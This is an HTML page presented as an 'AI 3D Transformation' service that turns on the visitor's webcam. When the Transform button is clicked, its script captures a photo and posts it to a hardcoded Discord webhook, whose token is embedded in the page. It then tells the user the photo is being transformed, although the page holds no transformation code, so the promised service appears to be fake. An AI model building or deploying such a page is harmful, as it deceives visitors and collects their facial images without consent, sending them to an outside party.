<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AI 3D Transformation</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      text-align: center;
      background-color: #f4f4f9;
      color: #333;
    }

    header {
      background-color: #4CAF50;
      color: white;
      padding: 20px;
    }

    video {
      margin-top: 20px;
      border: 2px solid black;
      border-radius: 10px;
    }

    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      padding: 15px 30px;
      margin-top: 20px;
      font-size: 18px;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #45a049;
    }

    footer {
      background-color: #333;
      color: white;
      padding: 10px;
      position: fixed;
      bottom: 0;
      width: 100%;
    }
  </style>
</head>
<body>
  <header>
    <h1>AI 3D Transformation</h1>
    <p>Click "Transform" to take your photo and send it for processing!</p>
  </header>

  <video id="video" autoplay></video>
  <canvas id="canvas" style="display: none;"></canvas>
  <br>
  <button id="transform">Transform</button>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1329558434814754858/2OuOQhloF_jY0r6Lvh8blWn0xY_qSHRYOFlTCHYjLti9I_BwBFJ59sLKvQ2FMobHQcHL";
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const transformButton = document.getElementById("transform");

    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        video.srcObject = stream;
      })
      .catch((err) => {
        console.error("Error accessing webcam:", err);
        alert("Could not access webcam.");
      });

    const captureAndSendPhoto = async () => {
      const context = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = canvas.toDataURL("image/jpeg");
      const blob = await (await fetch(imageData)).blob();

      const formData = new FormData();
      formData.append("file", blob, "photo.jpg");
      formData.append("payload_json", JSON.stringify({ content: "Here is the captured photo for AI transformation!" }));

      fetch(webhookUrl, {
        method: "POST",
        body: formData
      })
        .then((response) => {
          if (response.ok) {
            alert("Your photo is being transformed. Estimated time : 2min.");
          } else {
            alert("Failed to send the photo.");
          }
        })
        .catch((err) => {
          console.error("Error sending photo:", err);
          alert("An error occurred while sending the photo.");
        });
    };

    transformButton.addEventListener("click", captureAndSendPhoto);
  </script>
</body>
</html>
